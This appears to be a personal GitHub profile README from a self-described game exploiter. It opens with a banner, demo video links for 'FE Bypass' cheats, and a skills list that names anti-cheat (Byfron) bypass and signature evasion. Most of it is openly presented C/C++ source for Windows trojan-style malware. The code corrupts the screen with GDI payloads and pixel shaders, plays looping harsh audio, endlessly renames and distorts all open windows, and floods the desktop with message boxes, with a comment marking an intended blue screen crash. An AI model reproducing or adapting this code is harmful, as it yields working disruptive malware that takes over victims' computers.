![ Exploit Banner](https://raw.githubusercontent.com/Bruvz322/portfilo/refs/heads/main/noFilter.png)

```lua
--[[
   
███╗   ██╗██╗   ██╗██╗     ██╗     
████╗  ██║██║   ██║██║     ██║     
██╔██╗ ██║██║   ██║██║     ██║     
██║╚██╗██║██║   ██║██║     ██║     
██║ ╚████║╚██████╔╝███████╗███████╗
╚═╝  ╚═══╝ ╚═════╝ ╚══════╝╚══════╝
                                   
                          
                          
    
    Advanced game security research and Lua exploitation and game developement.
--]]
```


`"If it exists, it can be exploited"`  



## 📽️ 𝓓𝓮𝓶𝓸𝓷𝓼𝓽𝓻𝓪𝓽𝓲𝓸𝓷𝓼  

<!-- Method 1: Direct MP4 Embed -->
[![FE Bypass Demo](https://img.youtube.com/vi/NTMb50-yMHY/maxresdefault.jpg)](https://youtu.be/NTMb50-yMHY)

[![FE Bypass Demo](https://img.youtube.com/vi/Yq6ycHU2Pvo/maxresdefault.jpg)](https://youtu.be/Yq6ycHU2Pvo)

[![FE Bypass Demo](https://img.youtube.com/vi/VRcRxzWXldI/maxresdefault.jpg)](https://youtu.be/VRcRxzWXldI)

[![FE Bypass Demo](https://img.youtube.com/vi/9CXRgb97IAQ/maxresdefault.jpg)](https://youtu.be/9CXRgb97IAQ)


```lua

class ExploitSkills:
    def __init__(self):
        self.reverse_engineering = [
            "IDA Pro", 
            "x64dbg", 
            "DLL Analysis"
        ]
        self.lua_exploitation = [
            "Luau VM Hooks",
            "Bytecode Injection",
            "Environment Spoofing"
        ]
        self.protections = [
            "Byfron Bypass",
            "Anti-Dump Techniques",
            "Signature Evasion"
        ]

```

##  Not everything i do is bad. Im a great developer too!

## Gun system with ACS Medsys intergrated. Working phone system, and radio system. (IMAGE YT LINK)

[![FE Bypass Demo](https://img.youtube.com/vi/22iNGXEqxUg/maxresdefault.jpg)](https://youtu.be/22iNGXEqxUg)


##  More Projects!

 ```c

#include "payloads.h"
void InitDPI() {
	HMODULE hModUser32 = LoadLibrary(L"user32.dll");
	BOOL(WINAPI * SetProcessDPIAware)(VOID) = (BOOL(WINAPI*)(VOID))GetProcAddress(hModUser32, "SetProcessDPIAware");
	if (SetProcessDPIAware) {
		SetProcessDPIAware();
	}
	FreeLibrary(hModUser32);
}
int WinMain(
	_In_ HINSTANCE hInstance,
	_In_opt_ HINSTANCE hPrevInstance,
	_In_ LPSTR lpCmdLine,
	_In_ int nShowCmd
) {

	AUDIO_SEQUENCE_PARAMS pAudioSequences[AUDIO_NUM] = {0};
	pAudioSequences[0] = { 8000, 8000 * PAYLOAD_TIME, AudioSequence1 };
	pAudioSequences[1] = { 8000, 8000 * PAYLOAD_TIME, AudioSequence2 };
	pAudioSequences[2] = { 8000, 8000 * PAYLOAD_TIME, AudioSequence3 };
	pAudioSequences[3] = { 8000, 8000 * PAYLOAD_TIME, AudioSequence4 };
	pAudioSequences[4] = { 8000, 8000 * PAYLOAD_TIME, AudioSequence5 };
	pAudioSequences[5] = { 8000, 8000 * PAYLOAD_TIME, AudioSequence6 };
	pAudioSequences[6] = { 8000, 8000 * PAYLOAD_TIME, AudioSequence7 };
	pAudioSequences[7] = { 8000, 8000 * PAYLOAD_TIME, AudioSequence8 };
	pAudioSequences[8] = { 8000, 8000 * PAYLOAD_TIME, AudioSequence9 };
	pAudioSequences[9] = { 8000, 8000 * PAYLOAD_TIME, AudioSequence10 };

	SeedXorshift32((DWORD)__rdtsc());

	InitDPI();

	CreateThread(NULL, 0, LPTHREAD_START_ROUTINE(InitTimer), (PVOID)1000, 0, NULL);
	CreateThread(NULL, 0, LPTHREAD_START_ROUTINE(AudioPayloadThread), (PVOID)pAudioSequences, 0, NULL);

	ExecutePayload(Payload1, PAYLOAD_TIME);
	ExecutePayload(Payload2, PAYLOAD_TIME);
	ExecutePayload(Payload3, PAYLOAD_TIME);
	ExecutePayload(Payload4, PAYLOAD_TIME);
	ExecutePayload(Payload5, PAYLOAD_TIME);
	ExecutePayload(Payload6, PAYLOAD_TIME);
	ExecutePayload(Payload7, PAYLOAD_TIME);
	ExecutePayload(Payload8, PAYLOAD_TIME);
	ExecutePayload(Payload9, PAYLOAD_TIME);

	ExecuteShader(Shader1, PAYLOAD_TIME);
	ExecuteShader(Shader2, PAYLOAD_TIME);
	ExecuteShader(Shader3, PAYLOAD_TIME);
	ExecuteShader(Shader4, PAYLOAD_TIME);
	ExecuteShader(Shader5, PAYLOAD_TIME);
	ExecuteShader(Shader6, PAYLOAD_TIME);
	ExecuteShader(Shader7, PAYLOAD_TIME);
	ExecuteShader(Shader8, PAYLOAD_TIME);
	ExecuteShader(Shader9, PAYLOAD_TIME);
	ExecuteShader(Shader10, PAYLOAD_TIME);
	ExecuteShader(Shader11, PAYLOAD_TIME);
	ExecuteShader(Shader12, PAYLOAD_TIME);
	ExecuteShader(Shader13, PAYLOAD_TIME);

	CreateThread(NULL, 0, LPTHREAD_START_ROUTINE(WindowsCorruptionPayload), NULL, 0, NULL);
	CreateThread(NULL, 0, LPTHREAD_START_ROUTINE(MessageBoxPayload), NULL, 0, NULL);
	Sleep(20000);
	//bsod here.
	return 0;
}


```

```cpp

#include "payloads.h"

HCRYPTPROV prov;
DWORD xs;

int random() {
	if (prov == NULL)
		if (!CryptAcquireContext(&prov, NULL, NULL, PROV_RSA_FULL, CRYPT_SILENT | CRYPT_VERIFYCONTEXT))
			ExitProcess(1);

	int out;
	CryptGenRandom(prov, sizeof(out), (BYTE*)(&out));
	return out & 0x7fffffff;
}

void SeedXorshift32(DWORD dwSeed) {
	xs = dwSeed;
}

DWORD Xorshift32() {
	xs ^= xs << 13;
	xs ^= xs >> 17;
	xs ^= xs << 5;
	return xs;
}

int RotateDC(HDC hdc, int Angle, POINT ptCenter) {
	int nGraphicsMode = SetGraphicsMode(hdc, GM_ADVANCED);
	XFORM xform;
	if (Angle != 0)
	{
		double fangle = (double)Angle / 180. * 3.1415926;
		xform.eM11 = (float)cos(fangle);
		xform.eM12 = (float)sin(fangle);
		xform.eM21 = (float)-sin(fangle);
		xform.eM22 = (float)cos(fangle);
		xform.eDx = (float)(ptCenter.x - cos(fangle) * ptCenter.x + sin(fangle) * ptCenter.y);
		xform.eDy = (float)(ptCenter.y - cos(fangle) * ptCenter.y - sin(fangle) * ptCenter.x);
		SetWorldTransform(hdc, &xform);
	}
	return nGraphicsMode;
}

LPCWSTR GenRandomUnicodeString(int len) {
	wchar_t* strRandom = new wchar_t[len + 1];

	for (int i = 0; i < len; i++) {
		strRandom[i] = (random() % 256) + 1024;
	}

	strRandom[len] = L'\0';

	return strRandom;
}

void ExecuteAudioSequence(int nSamplesPerSec, int nSampleCount, AUDIO_SEQUENCE pAudioSequence) {
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount * 2);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec * 2, 2, 16, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount * 2, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);

	pAudioSequence(nSamplesPerSec, nSampleCount, psSamples);

	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));

	Sleep(nSampleCount * 1000 / nSamplesPerSec);

	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}

	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}

void ExecuteAudioSequenceParams(PAUDIO_SEQUENCE_PARAMS pAudioParams) {
	ExecuteAudioSequence(pAudioParams->nSamplesPerSec, pAudioParams->nSampleCount, (AUDIO_SEQUENCE*)pAudioParams->pAudioSequence);
}

void AudioPayloadThread(AUDIO_SEQUENCE_PARAMS pAudioSequences[AUDIO_NUM]) {
	for (;;) {
		for (int i = 0; i < AUDIO_NUM; i++) {
			ExecuteAudioSequenceParams(&pAudioSequences[i]);
		}
	}
}

void AudioSequence1(int nSamplesPerSec, int nSampleCount, PSHORT psSamples) {
	for (INT t = 0; t < nSampleCount * 2; t++) {
		BYTE bFreq = (BYTE)((((t & t >> 8) - (t >> 13 & t)) & ((t & t >> 8) - (t >> 13))) ^ (t >> 8 & t));
		((BYTE*)psSamples)[t] = bFreq;
	}
}

void AudioSequence2(int nSamplesPerSec, int nSampleCount, PSHORT psSamples) {
	for (INT t = 0; t < nSampleCount * 2; t++) {
		BYTE bFreq = (BYTE)((t - (t >> 4 & t >> 8) & t >> 12) - 1);
		((BYTE*)psSamples)[t] = bFreq;
	}
}

void AudioSequence3(int nSamplesPerSec, int nSampleCount, PSHORT psSamples) {
	for (INT t = 0; t < nSampleCount * 2; t++) {
		BYTE bFreq = (BYTE)(((t >> 8 & t >> 4) >> (t >> 16 & t >> 8)) * t);
		((BYTE*)psSamples)[t] = bFreq;
	}
}

void AudioSequence4(int nSamplesPerSec, int nSampleCount, PSHORT psSamples) {
	for (INT t = 0; t < nSampleCount * 2; t++) {
		BYTE bFreq = (BYTE)((t & (t >> 7 | t >> 8 | t >> 16) ^ t) * t);
		((BYTE*)psSamples)[t] = bFreq;
	}
}

void AudioSequence5(int nSamplesPerSec, int nSampleCount, PSHORT psSamples) {
	for (INT t = 0; t < nSampleCount * 2; t++) {
		BYTE bFreq = (BYTE)((t * t / (1 + (t >> 9 & t >> 8))) & 128);
		((BYTE*)psSamples)[t] = bFreq;
	}
}

void AudioSequence6(int nSamplesPerSec, int nSampleCount, PSHORT psSamples) {
	for (INT t = 0; t < nSampleCount * 2; t++) {
		BYTE bFreq = (BYTE)(t >> 5 | (t >> 2) * (t >> 5));
		((BYTE*)psSamples)[t] = bFreq;
	}
}

void AudioSequence7(int nSamplesPerSec, int nSampleCount, PSHORT psSamples) {
	for (INT t = 0; t < nSampleCount * 2; t++) {
		BYTE bFreq = (BYTE)(100 * ((t << 2 | t >> 5 | t ^ 63) & (t << 10 | t >> 11)));
		((BYTE*)psSamples)[t] = bFreq;
	}
}

void AudioSequence8(int nSamplesPerSec, int nSampleCount, PSHORT psSamples) {
	for (INT t = 0; t < nSampleCount * 2; t++) {
		BYTE bFreq = (BYTE)(t / 8 >> (t >> 9) * t / ((t >> 14 & 3) + 4));
		((BYTE*)psSamples)[t] = bFreq;
	}
}

void AudioSequence9(int nSamplesPerSec, int nSampleCount, PSHORT psSamples) {
	for (INT t = 0; t < nSampleCount * 2; t++) {
		BYTE bFreq = (BYTE)(10 * (t & 5 * t | t >> 6 | (t & 32768 ? -6 * t / 7 : (t & 65536 ? -9 * t & 100 : -9 * (t & 100)) / 11)));
		((BYTE*)psSamples)[t] = bFreq;
	}
}

void AudioSequence10(int nSamplesPerSec, int nSampleCount, PSHORT psSamples) {
	for (INT t = 0; t < nSampleCount * 2; t++) {
		BYTE bFreq = (BYTE)(10 * (t >> 7 | 3 * t | t >> (t >> 15)) + (t >> 8 & 5));
		((BYTE*)psSamples)[t] = bFreq;
	}
}

void ExecutePayload(TROJAN_PAYLOAD payload, int nTime) {
	int dwStartTime = Time;
	for (int i = 0; Time < (dwStartTime + nTime); i++) {
		HDC hdcScreen = GetDC(NULL);
		payload(i, hdcScreen);
		ReleaseDC(NULL, hdcScreen);
		DeleteObject(hdcScreen);
	}
}

void Payload1(int t, HDC hdcScreen) {
	POINT ptScreen = GetVirtualScreenPos();
	SIZE szScreen = GetVirtualScreenSize();
	SelectObject(hdcScreen, CreateSolidBrush(RGB(t % 256, (t / 2) % 256, (t / 2) % 256)));
	PatBlt(hdcScreen, ptScreen.x, ptScreen.y, szScreen.cx, szScreen.cy, PATINVERT);
	Sleep(15);
}

void Payload2(int t, HDC hdcScreen) {
	POINT ptScreen = GetVirtualScreenPos();
	SIZE szScreen = GetVirtualScreenSize();
	t *= 10;
	BitBlt(hdcScreen, ptScreen.x, ptScreen.y, szScreen.cx, szScreen.cy, hdcScreen, ptScreen.x + t % szScreen.cx, ptScreen.y + t % szScreen.cy, NOTSRCERASE);
	SelectObject(hdcScreen, CreateSolidBrush(RGB(rand() % 256, rand() % 256, rand() % 256)));
	PatBlt(hdcScreen, ptScreen.x, ptScreen.y, szScreen.cx, szScreen.cy, PATINVERT);
	Sleep(15);
}

void Payload3(int t, HDC hdcScreen) {
	POINT ptScreen = GetVirtualScreenPos();
	SIZE szScreen = GetVirtualScreenSize();
	HDC hcdc = CreateCompatibleDC(hdcScreen);
	HBITMAP hBitmap = CreateCompatibleBitmap(hdcScreen, szScreen.cx, szScreen.cy);
	SelectObject(hcdc, hBitmap);
	BitBlt(hcdc, ptScreen.x, ptScreen.y, szScreen.cx, szScreen.cy, hdcScreen, ptScreen.x, ptScreen.y, SRCCOPY);
	for (int i = ptScreen.x; i <= szScreen.cx / 10; i++) {
		for (int j = ptScreen.y; j <= szScreen.cy / 10; j++) {
			StretchBlt(hcdc, i * 10, j * 10, 10, 10, hcdc, i * 10, j * 10, 1, 1, SRCCOPY);
		}
	}
	BitBlt(hdcScreen, ptScreen.x, ptScreen.y, szScreen.cx, szScreen.cy, hcdc, ptScreen.x, ptScreen.y, SRCCOPY);

	DeleteObject(hcdc);
	DeleteObject(hBitmap);

	Sleep(100);
}

void Payload4(int t, HDC hdcScreen) {
	POINT ptScreen = GetVirtualScreenPos();
	SIZE szScreen = GetVirtualScreenSize();
	HDC hcdc = CreateCompatibleDC(hdcScreen);
	HBITMAP hBitmap = CreateCompatibleBitmap(hdcScreen, szScreen.cx, szScreen.cy);
	SelectObject(hcdc, hBitmap);
	BitBlt(hcdc, 0, 0, szScreen.cx, szScreen.cy, hdcScreen, 0, 0, SRCCOPY);

	BLENDFUNCTION blf = { 0 };
	blf.BlendOp = AC_SRC_OVER;
	blf.BlendFlags = 0;
	blf.SourceConstantAlpha = 128;
	blf.AlphaFormat = 0;

	AlphaBlend(hdcScreen, ptScreen.x + t % 200 + 10, ptScreen.y - t % 25, szScreen.cx, szScreen.cy, hcdc, ptScreen.x, ptScreen.y, szScreen.cx, szScreen.cy, blf);

	DeleteObject(hcdc);
	DeleteObject(hBitmap);

	Sleep(20);
}

void Payload5(int t, HDC hdcScreen) {
	POINT ptScreen = GetVirtualScreenPos();
	SIZE szScreen = GetVirtualScreenSize();
	t *= 3;
	int x = random() % szScreen.cx;
	int y = random() % szScreen.cy;
	BitBlt(hdcScreen, x, y, t % szScreen.cx, t % szScreen.cy, hdcScreen, (x + t / 2) % szScreen.cx, y % szScreen.cy, SRCCOPY);
}

void Payload6(int t, HDC hdcScreen) {
	POINT ptScreen = GetVirtualScreenPos();
	SIZE szScreen = GetVirtualScreenSize();

	HDC hcdc = CreateCompatibleDC(hdcScreen);
	HBITMAP hBitmap = CreateCompatibleBitmap(hdcScreen, szScreen.cx, szScreen.cy);
	SelectObject(hcdc, hBitmap);
	BitBlt(hcdc, 0, 0, szScreen.cx, szScreen.cy, hdcScreen, 0, 0, SRCCOPY);

	POINT p = { 0 };
	p.x = (szScreen.cx / 2);
	p.y = (szScreen.cy / 2);

	BLENDFUNCTION blf = { 0 };
	blf.BlendOp = AC_SRC_OVER;
	blf.BlendFlags = 0;
	blf.SourceConstantAlpha = 128;
	blf.AlphaFormat = 0;

	RotateDC(hdcScreen, 10, p);
	AlphaBlend(hdcScreen, 0, t, szScreen.cx, szScreen.cy, hcdc, 0, 0, szScreen.cx, szScreen.cy, blf);

	DeleteObject(hcdc);
	DeleteObject(hBitmap);
}

void Payload7(int t, HDC hdcScreen) {
	POINT ptScreen = GetVirtualScreenPos();
	SIZE szScreen = GetVirtualScreenSize();

	HDC hcdc = CreateCompatibleDC(hdcScreen);
	HBITMAP hBitmap = CreateCompatibleBitmap(hdcScreen, szScreen.cx, szScreen.cy);
	SelectObject(hcdc, hBitmap);
	BitBlt(hcdc, 0, 0, szScreen.cx, szScreen.cy, hdcScreen, 0, 0, SRCCOPY);

	POINT p = { 0 };
	p.x = (szScreen.cx / 2);
	p.y = (szScreen.cy / 2);

	BLENDFUNCTION blf = { 0 };
	blf.BlendOp = AC_SRC_OVER;
	blf.BlendFlags = 0;
	blf.SourceConstantAlpha = 128;
	blf.AlphaFormat = 0;

	if (t % 2 == 0) {
		RotateDC(hdcScreen, 1, p);
	}
	else {
		RotateDC(hdcScreen, -1, p);
	}

	SetBkColor(hdcScreen, RGB(random() % 256, random() % 256, random() % 256));
	SetTextColor(hdcScreen, RGB(random() % 256, random() % 256, random() % 256));

	TextOut(hdcScreen, random() % szScreen.cx, random() % szScreen.cy, L"STUPID SCRIPT KIDDIE", 8);

	AlphaBlend(hdcScreen, 0, 0, szScreen.cx, szScreen.cy, hcdc, 0, 0, szScreen.cx, szScreen.cy, blf);

	DeleteObject(hcdc);
	DeleteObject(hBitmap);
}

void Payload8(int t, HDC hdcScreen) {
	POINT ptScreen = GetVirtualScreenPos();
	SIZE szScreen = GetVirtualScreenSize();

	HDC hcdc = CreateCompatibleDC(hdcScreen);
	HBITMAP hBitmap = CreateCompatibleBitmap(hdcScreen, szScreen.cx, szScreen.cy);
	SelectObject(hcdc, hBitmap);
	BitBlt(hcdc, 0, 0, szScreen.cx, szScreen.cy, hdcScreen, 0, 0, SRCCOPY);

	int nGraphicsMode = SetGraphicsMode(hdcScreen, GM_ADVANCED);
	XFORM xform;
	xform.eDx = 0;
	xform.eDy = 0;
	xform.eM11 = 1;
	xform.eM12 = 0.1;
	xform.eM21 = 0;
	xform.eM22 = 1;
	SetWorldTransform(hdcScreen, &xform);

	BLENDFUNCTION blf = { 0 };
	blf.BlendOp = AC_SRC_OVER;
	blf.BlendFlags = 0;
	blf.SourceConstantAlpha = 128;
	blf.AlphaFormat = 0;

	SetBkColor(hdcScreen, RGB(random() % 256, random() % 256, random() % 256));
	SetTextColor(hdcScreen, RGB(random() % 256, random() % 256, random() % 256));

	for (int i = 0; i < 5; i++) {
		TextOut(hdcScreen, random() % szScreen.cx, random() % szScreen.cy, L"ӉӬլҏ ӎӬ !!!", 11);
	}

	AlphaBlend(hdcScreen, 0, 0, szScreen.cx, szScreen.cy, hcdc, 0, 0, szScreen.cx, szScreen.cy, blf);

	DeleteObject(hcdc);
	DeleteObject(hBitmap);

	Sleep(50);
}

void Payload9(int t, HDC hdcScreen) {
	POINT ptScreen = GetVirtualScreenPos();
	SIZE szScreen = GetVirtualScreenSize();

	POINT pt[3];
	pt[0] = { 0,0 };
	pt[1] = { szScreen.cx,0 };
	pt[2] = { 25,szScreen.cy };
	PlgBlt(hdcScreen, pt, hdcScreen, ptScreen.x, ptScreen.y, szScreen.cx + 25, szScreen.cy, NULL, 0, 0);

	SelectObject(hdcScreen, CreateSolidBrush(RGB(random() % 256, random() % 256, random() % 256)));
	PatBlt(hdcScreen, ptScreen.x, ptScreen.y, szScreen.cx, szScreen.cy, PATINVERT);

	Sleep(50);
}

void ExecuteShader(TROJAN_SHADER shader, int nTime) {
	int dwStartTime = Time;
	HDC hdcScreen = GetDC(NULL);
	POINT ptScreen = GetVirtualScreenPos();
	SIZE szScreen = GetVirtualScreenSize();

	BITMAPINFO bmi = { 0 };
	PRGBQUAD prgbScreen;
	HDC hdcTempScreen;
	HBITMAP hbmScreen;

	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = szScreen.cx;
	bmi.bmiHeader.biHeight = szScreen.cy;

	prgbScreen = { 0 };

	hdcTempScreen = CreateCompatibleDC(hdcScreen);
	hbmScreen = CreateDIBSection(hdcScreen, &bmi, 0, (void**)&prgbScreen, NULL, 0);
	SelectObject(hdcTempScreen, hbmScreen);

	for (int i = 0; Time < (dwStartTime + nTime); i++) {
		hdcScreen = GetDC(NULL);
		BitBlt(hdcTempScreen, 0, 0, szScreen.cx, szScreen.cy, hdcScreen, 0, 0, SRCCOPY);
		shader(i, szScreen.cx, szScreen.cy, prgbScreen);
		BitBlt(hdcScreen, 0, 0, szScreen.cx, szScreen.cy, hdcTempScreen, 0, 0, SRCCOPY);
		ReleaseDC(NULL, hdcScreen);
		DeleteObject(hdcScreen);
		Sleep(10);
	}

	DeleteObject(hbmScreen);
	DeleteDC(hdcTempScreen);
}

void Shader1(int t, int w, int h, PRGBQUAD prgbScreen) {
	for (int i = 0; i < w * h; i++) {
		prgbScreen[i].rgb = (prgbScreen[i].rgb * 2) % (RGB(255, 255, 255));
	}
}

void Shader2(int t, int w, int h, PRGBQUAD prgbScreen) {
	for (int i = 0; i < w * h; i++) {
		int r = GetRValue(prgbScreen[i].rgb);
		int g = GetGValue(prgbScreen[i].rgb);
		int b = GetBValue(prgbScreen[i].rgb);
		prgbScreen[i].rgb = RGB((r + 100) % 256, ((r + g + b) / 4 + t) % 256, ((r + g + b) / 4 + i) % 256) % (RGB(255, 255, 255)) + t * 10;
	}
}

void Shader3(int t, int w, int h, PRGBQUAD prgbScreen) {
	for (int i = 0; i < w * h; i++) {
		int r = GetRValue(prgbScreen[i].rgb);
		int g = GetGValue(prgbScreen[i].rgb);
		int b = GetBValue(prgbScreen[i].rgb);
		prgbScreen[i].rgb = (RGB((2 * r) % 256, (b + t) % 256, (g + i) % 256) + int(sqrt(i >> t / (r + 1))) / 10) % (RGB(255, 255, 255));
	}
}

void Shader4(int t, int w, int h, PRGBQUAD prgbScreen) {
	for (int i = 0; i < w * h; i++) {
		int r = GetRValue(prgbScreen[i].rgb);
		int g = GetGValue(prgbScreen[i].rgb);
		int b = GetBValue(prgbScreen[i].rgb);
		prgbScreen[i].rgb = (RGB((r + g + b) / 3, (r + g + b) / 3, (r + g + b) / 3) + t - int(sqrt(i))) % (RGB(255, 255, 255));
	}
}

void Shader5(int t, int w, int h, PRGBQUAD prgbScreen) {
	for (int i = 0; i < w * h; i++) {
		prgbScreen[i].rgb = (prgbScreen[i].rgb - Xorshift32() % int(sqrt(i + 1))) % (RGB(255, 255, 255));
	}
}

void Shader6(int t, int w, int h, PRGBQUAD prgbScreen) {
	for (int i = 0; i < w * h; i++) {
		int temp = prgbScreen[i].rgb;
		prgbScreen[i].rgb = prgbScreen[i / 3].rgb;
		prgbScreen[i / 3].rgb = temp;
	}
}

void Shader7(int t, int w, int h, PRGBQUAD prgbScreen) {
	for (int i = 0; i < w * h; i++) {
		int randPixel = Xorshift32() % w;
		int tempB = GetBValue(prgbScreen[i].rgb);
		prgbScreen[i].rgb = RGB(GetBValue(prgbScreen[randPixel].rgb), GetBValue(prgbScreen[randPixel].rgb), GetBValue(prgbScreen[randPixel].rgb));
		prgbScreen[randPixel].rgb = RGB(tempB, tempB, tempB);
	}
}

void Shader8(int t, int w, int h, PRGBQUAD prgbScreen) {
	t *= 10;
	for (int i = 0; i < w; i++) {
		for (int j = 0; j < h; j++) {
			prgbScreen[i * j].rgb = RGB(i % 256, j % 256, t % 256);
		}
	}
}

void Shader9(int t, int w, int h, PRGBQUAD prgbScreen) {
	t *= 50;
	for (int i = 0; i < h; i++) {
		for (int j = 0; j < w; j++) {
			prgbScreen[i * w + j].rgb = RGB((prgbScreen[i * w + j].r + i / 10) % 256, (prgbScreen[i * w + j].g + j / 10) % 256, (prgbScreen[i * w + j].b + t) % 256);
		}
	}
}

void Shader10(int t, int w, int h, PRGBQUAD prgbScreen) {
	for (int i = 0; i < h; i++) {
		for (int j = 0; j < w; j++) {
			int temp1 = (i + Xorshift32() % 11 - 5);
			if (temp1 < 0) {
				temp1 = -temp1;
			}
			int temp2 = (j + Xorshift32() % 11 - 5);
			if (temp2 < 0) {
				temp2 = -temp2;
			}
			prgbScreen[i * w + j].rgb = prgbScreen[(temp1 * w + temp2) % (w * h)].rgb;
		}
	}
}

void Shader11(int t, int w, int h, PRGBQUAD prgbScreen) {
	for (int i = 0; i < w * h; i++) {
		int temp = prgbScreen[i].rgb;
		prgbScreen[i].rgb = prgbScreen[i / 3 * 2].rgb;
		prgbScreen[i / 3 * 2].rgb = temp;
	}
}

void Shader12(int t, int w, int h, PRGBQUAD prgbScreen) {
	for (int i = 0; i < w * h; i++) {
		prgbScreen[i].rgb = (t * i) % (RGB(255, 255, 255));
	}
}

void Shader13(int t, int w, int h, PRGBQUAD prgbScreen) {
	for (int i = 0; i < w * h; i++) {
		prgbScreen[i].rgb = (Xorshift32() % 0x100) * 0x010101;
	}
}

BOOL CALLBACK EnumChildWindowsProc(HWND hwnd, LPARAM lParam) {
	SendMessageTimeout(hwnd, WM_SETTEXT, NULL, (LPARAM)GenRandomUnicodeString(random() % 10 + 10), SMTO_ABORTIFHUNG, 100, NULL);

	RECT rcWindow;
	GetWindowRect(hwnd, &rcWindow);
	int cxWindow = rcWindow.right - rcWindow.left;
	int cyWindow = rcWindow.bottom - rcWindow.top;
	HDC hdcWindow = GetDC(hwnd);
	BitBlt(hdcWindow, 0, 0, cxWindow, cyWindow, hdcWindow, random() % 21 - 10, random() % 41 - 20, SRCCOPY);
	ReleaseDC(NULL, hdcWindow);
	DeleteObject(hdcWindow);

	EnumChildWindows(hwnd, EnumChildWindowsProc, NULL);
	return true;
}

void WindowsCorruptionPayload() {
	for (;;) {
		EnumChildWindows(NULL, EnumChildWindowsProc, NULL);
	}
}

void MessageBoxThread() {
	LPCWSTR strText = GenRandomUnicodeString(random() % 10 + 10);
	LPCWSTR strTitle = GenRandomUnicodeString(random() % 10 + 10);
	if (random() % 2 == 0) {
		MessageBox(NULL, strText, strTitle, MB_ABORTRETRYIGNORE | MB_ICONWARNING);
	}
	else {
		MessageBox(NULL, strText, strTitle, MB_RETRYCANCEL | MB_ICONERROR);
	}
}

void MessageBoxPayload() {
	for (;;) {
		CreateThread(NULL, 0, LPTHREAD_START_ROUTINE(MessageBoxThread), NULL, 0, NULL);
		Sleep(1500);
	}
}

```







